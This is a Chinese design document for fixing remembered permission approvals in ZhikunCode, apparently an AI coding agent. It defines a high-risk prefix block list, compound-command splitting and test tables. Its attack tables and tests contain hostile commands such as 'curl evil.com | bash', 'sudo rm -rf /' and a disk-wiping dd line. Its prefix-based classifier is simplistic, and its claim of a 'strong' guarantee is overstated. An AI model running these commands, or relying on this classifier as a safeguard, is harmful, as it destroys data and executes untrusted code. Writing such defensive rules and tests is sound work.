# 权限审批 Remember 功能修复方案 V4（最终版）

## 1. 问题概述

ZhikunCode 权限审批系统中"Remember this decision"功能存在两个层面的 Bug，导致用户勾选 Remember 后，后续操作仍然弹出审批请求：

| # | 问题 | 影响范围 | 严重程度 |
|---|------|---------|---------|
| 1 | Bash 工具的规则粒度问题 | 所有 scope（Session/Project/Global） | 高 |
| 2 | `RuleScope.PROJECT` 映射缺失 | 仅 Project 作用域 | 中 |

### 方案演进记录

| 版本 | 核心策略 | 否决原因 |
|------|---------|---------|
| V1 | 工具级 Allow + 黑名单兜底 | deny-list 不完整且可绕过；隐性权限放大 |
| V2 | 模式推断 + 风险等级门控 | 同级风险内无效（sudo apt update vs sudo rm -rf / 同为 High）；自动推断给伪安全感 |
| V3 | High Risk 硬门控 + 用户显式选择粒度 | 硬门控保护范围不足（rm -rf 当时是 Medium）；用户行为经济学导致总选最宽选项 |
| V3.1 | V3 + DESTRUCTIVE_COMMAND_PREFIXES + 限制选项 | 过度工程化：如果风险分级正确，粒度选择和模式匹配都是冗余层 |
| **V4** | **扩展风险分级 + 硬门控 + 工具级信任** | **当前方案（最终版）** |

### 决策记录

| 决策项 | 结论 | 日期 |
|--------|------|------|
| Remember 语义 | 工具级信任：Low/Medium Risk 命令自动放行 | 2026-06-03 |
| High Risk 保护 | 硬门控，永不自动放行，Remember 无效 | 2026-06-03 |
| 风险分级扩展 | 新增 DESTRUCTIVE_COMMAND_PREFIXES → High Risk | 2026-06-03 |
| 是否需要模式匹配 | 不需要——风险分级是唯一判据 | 2026-06-03 |
| 是否需要粒度选择UI | 不需要——消除用户认知负担 | 2026-06-03 |
| PROJECT 作用域存储 | 新增 USER_PROJECT + 独立存储层 | 2026-06-03 |
| USER_PROJECT 枚举复用策略 | 直接复用已有的 USER_PROJECT 向后兼容别名，不新增枚举值 | 2026-06-03 |
| PROJECT Key | 使用 workspace 根路径作为 project key（已决策，无待定项） | 2026-06-03 |
| 复合命令正则范围 | `\|`、`&&`、`\|\|`、`;` 为 P0 覆盖范围；`$(...)` 子命令替换作为 P1 增量补充（已决策） | 2026-06-03 |

> ✅ **无待定事项**：本方案所有设计决策均已确认，无 TBD / 待决策项，可直接进入实施。

---

## 2. 设计原则

| 原则 | 说明 |
|------|------|
| 风险分级是唯一安全判据 | 不依赖模式匹配、不依赖用户选择、不依赖黑名单——只依赖系统风险评估 |
| High Risk 绝对门控 | 高风险命令永远需要审批，Remember 对其无效，不可绕过 |
| 最简实现 | 不引入模式匹配、通配符、前缀提取等新复杂度——删除比新增更好 |
| 零用户认知负担 | Remember 的含义清晰单一："正常操作不再打扰，危险操作仍会确认" |
| 利用已有基础设施 | 系统已有 per-command 风险评估引擎（BashCommandClassifier + BARE_SHELL_PREFIXES），直接复用 |

### 2.1 为什么不需要模式匹配和粒度选择

| 被否决的设计 | 它试图解决什么 | 为什么不需要 |
|------------|-------------|------------|
| 前缀模式 `cmd *` | 区分"允许 npm"但不允许"git" | 实际用户不需要这种精细度；如果真需要，应通过配置文件而非审批弹窗 |
| 粒度选择 UI | 让用户控制 Remember 范围 | 增加认知负担；用户倾向选最宽（行为经济学）；风险分级已足够区分安全/危险 |
| 风险等级同级门控 | 防止模式匹配放行同类高危命令 | 直接将破坏性命令升级为 High Risk 更彻底——从根源解决，而非在匹配层打补丁 |

---

## 3. 问题详细分析

### 3.1 问题1：Bash 工具的规则粒度问题

**现象**：用户选择 Remember 后，下一个不同的 Bash 命令仍然弹出审批。

**根因**：`PermissionPipeline.rememberDecision()` 对 Bash 工具存储规则时，把具体命令内容存入规则：

```java
// PermissionPipeline.java — rememberDecision() 方法中的 Bash 命令内容存储逻辑
if (BASH_TOOL_NAMES.contains(toolName)) {
    ruleContent = input.getOptionalString("command").orElse(null);
}
```

匹配时要求精确匹配命令内容，导致不同命令无法匹配已有规则。

**V4 修复**：删除此逻辑，不再为 Bash 工具存储命令内容。ruleContent = null 时，规则匹配整个工具的所有调用。安全由硬门控保证。

### 3.2 问题2：RuleScope.PROJECT 映射缺失

**现象**：选择 "This project" 时，决策被错误映射为 GLOBAL。

**根因**：

```java
// PermissionPipeline.java — rememberDecision() 方法中的 scope 映射逻辑
PermissionRuleSource source = scope == RuleScope.SESSION
        ? PermissionRuleSource.USER_SESSION
        : PermissionRuleSource.USER_GLOBAL;  // PROJECT 被错误映射
```

---

## 4. 修复方案

### 4.1 方案A：扩展风险分级 + 硬门控（P0 安全基础）

#### 4.1.1 扩展风险分级

系统已有 `BARE_SHELL_PREFIXES`（shell 包装器 + 权限提升）→ High Risk。新增 `DESTRUCTIVE_COMMAND_PREFIXES`（文件破坏 + 不可逆操作）→ 同样 High Risk。

**修改位置**：`PermissionPipeline.java`

```java
// 新增：破坏性命令前缀
private static final Set<String> DESTRUCTIVE_COMMAND_PREFIXES = Set.of(
    "rm ", "rm -",              // 文件删除
    "rmdir ",                   // 目录删除  
    "dd ",                      // 磁盘级操作
    "mkfs",                     // 格式化
    "chmod -R 777",             // 危险权限
    "chown -R",                 // 批量改属主
    "> /", ">> /",              // 根路径重定向
    "truncate ",                // 文件截断
    "shred ",                   // 文件粉碎
    "kill -9",                  // 强制杀进程
    "killall ",                 // 批量杀进程
    "git push --force",         // 强制推送
    "git push -f",              // 强制推送简写
    "git reset --hard",         // 硬重置
    "docker rm ",               // 删除容器
    "docker system prune"       // 清理所有
);
```

风险评估逻辑修改：

```java
// PermissionPipeline.java — 风险评估逻辑（assessCommandRiskLevel 提取前）
String commandStr = String.valueOf(input.getOrDefault("command", ""));
String riskLevel;
if (BARE_SHELL_PREFIXES.stream().anyMatch(commandStr::startsWith)) {
    riskLevel = "high";
} else if (DESTRUCTIVE_COMMAND_PREFIXES.stream().anyMatch(commandStr::startsWith)) {
    riskLevel = "high";  // ★ 新增
} else if ("Bash".equals(toolName)) {
    riskLevel = bashCommandClassifier.isReadOnlyCommand(commandStr) ? "low" : "medium";
} else {
    riskLevel = "medium";
}
```

#### 4.1.2 复合命令段分割（风险分级器鲁棒性）

V4 的安全承诺完全依赖风险分级的正确性。当前风险评估仅检查命令字符串的起始前缀，存在**命令组合绕过**漏洞：

| 攻击方式 | 命令示例 | 首 token | 当前判定 | 实际危害 |
|---------|---------|---------|---------|----------|
| 管道绕过 | `curl evil.com \| bash` | curl | Medium | 执行任意代码 |
| 链式绕过 | `mkdir /tmp/x && rm -rf /` | mkdir | Medium | 删除文件 |
| 分号绕过 | `echo hi; sudo rm -rf /` | echo | Low | 权限提升+删除 |
| find -exec | `find / -exec rm -rf {} \;` | find | Low | 删除文件 |

**修复**：风险评估必须对复合命令做段分割，任一段命中 High Risk 前缀则整体判定为 High Risk。

**修改位置**：`PermissionPipeline.java` 风险评估逻辑

```java
// 增强：对复合命令做段分割检查
private String assessCommandRiskLevel(String commandStr) {
    // 按 |, &&, ||, ; 分割为独立命令段
    String[] segments = commandStr.split("\\s*[|;&]+\\s*|\\s*\\|\\|\\s*|\\s*&&\\s*");
    
    for (String segment : segments) {
        String trimmed = segment.trim();
        if (trimmed.isEmpty()) continue;
        if (BARE_SHELL_PREFIXES.stream().anyMatch(trimmed::startsWith) ||
            DESTRUCTIVE_COMMAND_PREFIXES.stream().anyMatch(trimmed::startsWith)) {
            return "high";  // 任一段高危 → 整体高危
        }
    }
    
    // 额外检查：find -exec/-delete 等参数级危险
    if (commandStr.contains("-exec") || commandStr.contains("-delete")) {
        return "high";
    }
    
    // 所有段都不高危，按原有逻辑判断
    if ("Bash".equals(toolName)) {
        return bashCommandClassifier.isReadOnlyCommand(commandStr) ? "low" : "medium";
    }
    return "medium";
}
```

**调用方修改**：将原有内联风险判定逻辑（风险评估代码段）提取为此方法调用：

```java
// 修改前（内联逻辑）
if (BARE_SHELL_PREFIXES.stream().anyMatch(commandStr::startsWith)) { ... }

// 修改后（方法调用）
String riskLevel = assessCommandRiskLevel(commandStr);
```

**这是 V4 安全承诺的必要前提**——没有段分割，硬门控可被管道/链式命令绕过。

#### 4.1.3 硬门控

**修改位置**：`PermissionRuleMatcher.java`

```java
public PermissionRule findAllowRule(PermissionContext context, Tool tool, 
                                     ToolInput input, String riskLevel) {
    // ★ 硬门控：High Risk 命令永远不自动放行，Remember 无效
    if ("high".equals(riskLevel)) {
        return null;
    }
    return findMatchingRule(context.alwaysAllowRules(), tool, input);
}
```

**调用方修改**：`PermissionPipeline` 中调用 `findAllowRule` 时传入 `riskLevel` 参数。

### 4.2 方案B：Remember = 工具级信任（P0 核心修复）

> **前置依赖**：本方案必须与方案A（硬门控 + DESTRUCTIVE_COMMAND_PREFIXES + 复合命令段分割）同步部署。单独部署方案B会导致所有命令（含高危命令）自动放行。

#### 修复逻辑

`rememberDecision()` 不再存储 Bash 命令内容，直接按工具级存储规则：

**修改位置**：`PermissionPipeline.java` 的 `rememberDecision()` 方法

```java
public void rememberDecision(Tool tool, ToolInput input,
                              boolean allowed, RuleScope scope) {
    String toolName = tool.getName();
    
    // ★ V4: 不再存储具体命令内容，统一按工具级存储
    // 安全由硬门控保证（High Risk 永远需要审批）
    String ruleContent = null;
    
    PermissionRuleSource source = switch (scope) {
        case SESSION -> PermissionRuleSource.USER_SESSION;
        case PROJECT -> PermissionRuleSource.USER_PROJECT;
        case GLOBAL  -> PermissionRuleSource.USER_GLOBAL;
    };
    
    PermissionRuleValue value = new PermissionRuleValue(toolName, ruleContent);
    PermissionRule rule = new PermissionRule(source,
            allowed ? PermissionBehavior.ALLOW : PermissionBehavior.DENY,
            value);
    
    if (allowed) {
        ruleRepository.addAllowRule(rule);
    } else {
        ruleRepository.addDenyRule(rule);
    }
}
```

**改动点说明**：
1. 删除了 `if (BASH_TOOL_NAMES.contains(toolName)) { ruleContent = ... }` 逻辑
2. `ruleContent` 永远为 null → Matcher 的 `matchesRule()` 在无内容条件时直接返回 true → 工具级匹配
3. 同时修复了 PROJECT 映射（switch 表达式）

#### 用户体验流程

```
[第1次] cd /path/to/dir  → Medium Risk → 弹出审批
        用户: Allow + Remember (This session)
        
[第2次] npm install      → Medium Risk → 自动放行 ✓ (同工具 + 非High)
[第3次] git status       → Low Risk    → 自动放行 ✓ (同工具 + 非High)
[第4次] ls -la           → Low Risk    → 自动放行 ✓ (同工具 + 非High)
[第5次] rm -rf /tmp/test → High Risk   → 弹出审批 ✗ (硬门控拦截)
[第6次] sudo apt update  → High Risk   → 弹出审批 ✗ (硬门控拦截)
[第7次] npm test         → Medium Risk → 自动放行 ✓
```

用户心智模型：**"我点了 Remember，正常操作不再打扰我，危险操作仍会确认"**

### 4.3 方案C：PROJECT 映射修复（P1）

**修改位置**：`PermissionPipeline.java`（已在方案B中一并修复）

```java
PermissionRuleSource source = switch (scope) {
    case SESSION -> PermissionRuleSource.USER_SESSION;
    case PROJECT -> PermissionRuleSource.USER_PROJECT;  // 复用已有别名，无需新增枚举值
    case GLOBAL  -> PermissionRuleSource.USER_GLOBAL;
};
```

**配套修改**：
1. 复用已有的 `PermissionRuleSource.USER_PROJECT` 向后兼容别名（源码中已存在，无需新增）
2. `PermissionRuleRepository` 新增 `projectAllowRules` / `projectDenyRules` 存储
3. `addAllowRule` / `addDenyRule` 路由 `USER_PROJECT` 到项目级存储
4. `getAllowRules()` / `getDenyRules()` 合并时包含项目级规则
5. 项目标识：workspace 根路径作为 project key
6. 生命周期：切换/关闭项目时清理对应规则

---

## 5. 方案全版本对比

| 维度 | V1 | V2 | V3/V3.1 | V4 |
|------|-----|-----|---------|-----|
| 安全模型 | 黑名单 | 风险等级门控 | 硬门控+粒度选择 | **硬门控+扩展风险分级** |
| Remember 粒度 | 工具级 | 模式级 | 用户选择 | **工具级（安全由硬门控保证）** |
| 模式匹配 | 无 | 自动推断 | 用户选择模式 | **无（不需要）** |
| 前端改动 | 无 | 无 | 大（RadioGroup） | **无** |
| 后端改动 | 小 | 中 | 大 | **小（删代码 + 加判断）** |
| 用户认知负担 | 低 | 低 | 中 | **零** |
| 安全保证 | 弱（黑名单不完整） | 弱（同级无效） | 中（依赖用户选择） | **强（系统强制）** |
| 正确性 | 低 | 低 | 中 | **高** |
| 可维护性 | 中（维护黑名单） | 低（推断逻辑复杂） | 低（前后端协议复杂） | **高（纯后端，逻辑简单）** |

---

## 6. 涉及文件清单

| 文件路径 | 修改内容 | 改动量 |
|---------|---------|--------|
| `backend/.../permission/PermissionPipeline.java` | 1. 新增 DESTRUCTIVE_COMMAND_PREFIXES 2. 风险评估逻辑扩展 3. rememberDecision() 删除命令内容存储 + 修复 PROJECT 映射 + 复合命令段分割方法 assessCommandRiskLevel() | ~30行 |
| `backend/.../permission/PermissionRuleMatcher.java` | findAllowRule() 增加 riskLevel 参数和 High Risk 硬门控 | ~5行 |
| `backend/.../permission/PermissionRuleRepository.java` | 新增 projectAllowRules/projectDenyRules 存储 + 路由 + 合并逻辑 | ~30行 |
| `backend/.../model/PermissionRuleSource.java` | 无需修改——USER_PROJECT 向后兼容别名已存在 | 0行 |

**总改动量**：~66行后端代码，无前端改动。

---

## 7. 风险评估

| 风险项 | 等级 | 缓解措施 |
|--------|------|---------|
| DESTRUCTIVE_COMMAND_PREFIXES 不完整 | 低 | 这是 allow-list 的增量扩展，可持续补充；遗漏的命令为 Medium Risk，Remember 后自动放行——用户已明确授权工具级信任 |
| `rm temp.txt` 也被硬门控（用户觉得烦） | 低 | 这是安全与便利的正确取舍点。rm 有不可逆性，值得每次确认。UI 可提示"高风险命令始终需要确认" |
| 工具级信任过于宽泛 | 低 | High Risk 硬门控已兜底所有危险命令；Medium 命令（npm/git/mkdir 等）本身无不可逆性 |
| PROJECT 规则泄漏到其他项目 | 中 | 用 workspace 根路径做 key，查询时严格校验 |
| 未来需要更精细控制 | 低 | 可通过配置文件（类似 .claude/settings.json）支持高级用户自定义模式规则，不影响 V4 核心设计 |
| 分割正则遗漏特殊语法（如 $(...) 子命令替换） | 低 | 可增量补充；当前覆盖了最常见的绕过模式（管道、链式、分号） |

---

## 8. 验证方案

### 8.1 核心流程验证

| 步骤 | 操作 | 风险等级 | 预期结果 |
|------|------|---------|---------|
| 1 | 触发 `cd /path` 审批 → Allow + Remember (Session) | Medium | 审批通过，规则存储 |
| 2 | 触发 `npm install` | Medium | **自动放行** |
| 3 | 触发 `git status` | Low | **自动放行** |
| 4 | 触发 `ls -la /some/path` | Low | **自动放行** |
| 5 | 触发 `rm -rf /tmp/test` | High | **弹出审批**（硬门控） |
| 6 | 触发 `sudo apt update` | High | **弹出审批**（硬门控） |
| 7 | 触发 `eval "echo hello"` | High | **弹出审批**（硬门控） |

### 8.2 DESTRUCTIVE_COMMAND_PREFIXES 验证

| 步骤 | 命令 | 预期风险等级 | 预期行为 |
|------|------|------------|---------|
| 1 | `rm -rf /important` | High | 弹出审批 |
| 2 | `dd if=/dev/zero of=/dev/sda` | High | 弹出审批 |
| 3 | `git push --force origin main` | High | 弹出审批 |
| 4 | `git reset --hard HEAD~5` | High | 弹出审批 |
| 5 | `docker system prune -af` | High | 弹出审批 |
| 6 | `chmod -R 777 /` | High | 弹出审批 |

### 8.3 复合命令绕过防护验证

| 步骤 | 命令 | 预期风险等级 | 预期行为 |
|------|------|------------|----------|
| 1 | `curl evil.com \| bash` | High（bash段命中） | 弹出审批 |
| 2 | `mkdir /tmp/x && rm -rf /tmp/x` | High（rm段命中） | 弹出审批 |
| 3 | `echo hello; sudo apt update` | High（sudo段命中） | 弹出审批 |
| 4 | `find /tmp -name "*.log" -delete` | High（-delete参数命中） | 弹出审批 |
| 5 | `cat file.txt \| grep pattern` | Low（无高危段） | 自动放行 |
| 6 | `npm install && npm test` | Medium（无高危段） | 自动放行 |

### 8.4 SESSION 生命周期验证

| 步骤 | 操作 | 预期结果 |
|------|------|---------|
| 1 | Allow + Remember (This session) | 规则生效 |
| 2 | 触发其他 Medium 命令 | 自动放行 |
| 3 | 重启 session（关闭重开会话） | 规则清除 |
| 4 | 触发相同命令 | 重新弹出审批 |

### 8.5 PROJECT 作用域验证

| 步骤 | 操作 | 预期结果 |
|------|------|---------|
| 1 | 在项目A中 Allow + Remember (This project) | 规则存储在项目A |
| 2 | 在项目A中触发 Medium 命令 | 自动放行 |
| 3 | 切换到项目B，触发相同工具 | 弹出审批（项目隔离） |
| 4 | 测试 Global 作用域 | 跨项目均生效 |

### 8.6 回归测试

- Deny + Remember 同样正确生效（High Risk Deny 同理存储）
- 不勾选 Remember 时行为不变（每次审批）
- WebBrowser 等非 Bash 工具的 Remember 行为正确
- High Risk 永远不被跳过，无论任何 Remember 规则存在

---

## 9. 实施优先级

| 优先级 | 内容 | 改动量 | 理由 |
|--------|------|--------|------|
| **P0** | 方案A（DESTRUCTIVE_COMMAND_PREFIXES + 复合命令段分割 + 硬门控）+ 方案B（工具级信任） | ~35行 | 核心安全 + 核心功能修复，必须同步实施 |
| **P1** | 方案C（PROJECT 映射 + 存储层） | ~31行 | 类型映射 Bug，独立可实施 |

> ⚠️ **强制约束**：方案A（硬门控）与方案B（工具级信任）**必须同步实施，禁止单独部署方案B**。
>
> 原因：方案B 删除命令内容存储后，Remember = 信任该工具的所有命令。如果没有方案A的硬门控保护，`rm -rf /` 等高危命令也会被自动放行——这比修复前更危险。

### 9.1 实施批次说明

| 批次 | 内容 | 依赖关系 | 可独立部署 |
|------|------|---------|-----------|
| 第1批（P0） | 方案A + 方案B 同步实施 | 无外部依赖 | ✅ |
| 第2批（P1） | 方案C（PROJECT 存储层） | 独立于第1批 | ✅ |

---

## 10. 未来扩展（不在本次实施范围）

| 扩展方向 | 场景 | 实现方式 |
|---------|------|---------|
| 高级用户自定义规则 | "我要精细控制：允许 npm * 但不允许 git push" | 配置文件（类似 .claude/settings.json），不影响审批弹窗 UX |
| WebBrowser 细粒度风险 | file_upload、form_fill 等操作风险更高 | 扩展 WebBrowser 的 per-action 风险评估 |
| 风险分级自学习 | 根据用户历史审批行为动态调整风险等级 | ML 模型/统计分析，长期优化项 |

---

## 11. 可执行性检查清单

| # | 检查项 | 状态 | 说明 |
|---|--------|------|------|
| 1 | 所有设计决策已确认 | ✅ | 无待定事项（见 §1 决策记录） |
| 2 | 方案A+B 不可拆分约束已标注 | ✅ | 见 §9 P0 强制约束 |
| 3 | 涉及文件和修改位置已明确 | ✅ | 见 §6 涉及文件清单 |
| 4 | 每个修改点有具体代码片段 | ✅ | 各方案章节内含代码 |
| 5 | 验证方案和测试用例已定义 | ✅ | 见 §8 验证方案 |
| 6 | 枚举复用策略已确认 | ✅ | USER_PROJECT 直接复用 |
| 7 | 行号引用已解耦为方法级定位 | ✅ | 不依赖具体行号 |
| 8 | 前端改动评估 | ✅ | 零前端改动 |
| 9 | 总代码改动量估算 | ✅ | ~66行后端代码 |
